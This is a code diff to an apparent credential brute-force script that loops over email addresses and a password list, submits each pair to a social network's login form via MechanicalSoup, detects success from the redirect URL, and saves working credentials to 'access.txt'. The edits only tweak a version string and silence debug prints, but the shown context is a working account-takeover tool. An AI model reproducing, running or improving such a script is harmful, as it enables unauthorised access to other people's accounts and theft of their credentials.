@@ -20,7 +20,7 @@ except:
 	OS = system()
 	if OS == 'Windows':
 			print("[+] Must install mechanicalsoup library for Windows OS")
-			print(" -  Open CMD and use this command 'C:\Python{}\Scripts\pip.exe install MechanicalSoup'".format(pyversion[:3]))
+			print(" -  Open CMD and use this command 'C:\Python{}\Scripts\pip.exe install MechanicalSoup'".format(pyversion[:3].rstrip(".")))
 			exit()
 	elif OS == 'Linux':
 			print("[+] Must install mechanicalsoup library for Linux OS")
@@ -182,7 +182,7 @@ def run(emails,passlist,timernextupfun,blockedtimerfun,typicalstatus):
 				login_form.select("#pass")[0]['value'] = passwd
 				page = browser.submit(login_form, login_page.url)
 				urlstatus = str(page.url)
-				print(urlstatus)
+				#print(urlstatus)
 				if 'checkpoint' in urlstatus:
 					getsetting = False
 				elif 'login.php' not in urlstatus:
@@ -208,7 +208,7 @@ def run(emails,passlist,timernextupfun,blockedtimerfun,typicalstatus):
 					elif "Sign Up" in gettext:
 						signupcounter += 1
 
-				print("[!] Debuger signup : {}".format(signupcounter))
+				#print("[!] Debuger signup : {}".format(signupcounter))
 				if getsetting != None:
 					print("[+] Success login account {}, password = {}, status = {}".format(email,passwd,getsetting))
 					saving = open('access.txt','a')
